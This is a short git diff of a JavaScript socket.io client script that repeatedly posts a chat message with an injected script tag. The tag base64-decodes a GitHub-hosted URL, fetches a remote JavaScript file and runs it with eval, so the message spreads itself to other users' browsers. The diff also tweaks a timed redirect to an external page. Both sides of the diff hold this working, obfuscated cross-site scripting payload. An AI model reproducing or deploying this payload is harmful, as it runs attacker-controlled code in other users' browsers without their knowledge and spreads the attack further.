@@ -24,7 +24,7 @@ setInterval(() => {
 }, 500)
 setInterval(() => {
 socket.emit("talk", {
-    text: "SPREAD THE WORD, THE 2026 IS COMING. <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'2026'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
+    text: "SPREAD THE WORD, THE 2026 IS COMING. <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'R2026S'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
 });
 },500)
 socket.emit('command',{
@@ -33,5 +33,5 @@ socket.emit('command',{
 // Redirects the user after 5 seconds (5000 milliseconds)
 setTimeout(function() {
   window.location.href = 'https://ivorydevrimoalt.github.io/2026.IS.NEW.YEAR/';
-}, 100);
+}, 1000);
 }, 3000);
